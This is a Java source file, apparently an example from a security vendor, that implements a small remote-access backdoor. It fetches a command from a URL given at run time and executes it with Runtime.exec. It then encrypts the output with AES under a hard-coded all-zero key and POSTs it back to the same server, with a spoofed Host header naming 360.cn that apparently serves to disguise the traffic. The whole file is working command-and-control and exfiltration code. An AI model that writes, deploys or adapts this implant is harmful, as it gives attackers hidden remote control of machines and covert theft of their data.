package cn.qianxin.example;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class KFCrazyDay {
    static String encryptionKey = "0000000000000000"; // 128-bit key
    static String postUrl;
    static String encString;

    public static void main(String[] args) throws Exception {

        URL url = new URL(args[0]);
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("GET");
        con.setConnectTimeout(5000);
        con.setReadTimeout(5000);
        BufferedReader in = new BufferedReader(
                new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer content = new StringBuffer();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }
        in.close();
        con.disconnect();
        System.out.println(content.toString());
        System.setProperty("sun.net.http.allowRestrictedHeaders", "true");
        String command = content.toString();
        String commandOutput = executeCommand(command);
        postUrl = args[0];
        if (postUrl.startsWith("http://")) {
            sendHttpPostRequest(postUrl, commandOutput);
        } else {
            System.out.println("Fuck");
            System.exit(-1);
        }
    }

    public static String encrypt(String input, String key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] encryptedBytes = cipher.doFinal(input.getBytes());
        return Base64.getEncoder().encodeToString(encryptedBytes);
    }


    private static String executeCommand(String command) throws Exception {
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;

        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        encString = encrypt(output.toString(), encryptionKey);
        return encString;
    }

    public static String encodeToBase64(String message) {
        byte[] bytesToEncode = message.getBytes();
        byte[] encodedBytes = Base64.getEncoder().encode(bytesToEncode);
        return new String(encodedBytes);
    }

    private static void sendHttpPostRequest(String postUrl, String postData) throws IOException {
        URL url = new URL(postUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.addRequestProperty("Host","https://www.360.cn/");
        connection.setConnectTimeout(3000);
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = postData.getBytes("UTF-8");
            os.write(input, 0, input.length);
        }

        int responseCode = connection.getResponseCode();
        System.out.println("HTTP Response Code: " + responseCode);

        // Handle the response, if needed
        if (responseCode == HttpURLConnection.HTTP_OK) {
            // Read and process the response
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            System.out.println("HTTP Response:\n" + response.toString());
        } else {
            System.err.println("HTTP POST request failed");
        }
        connection.disconnect();
    }
}
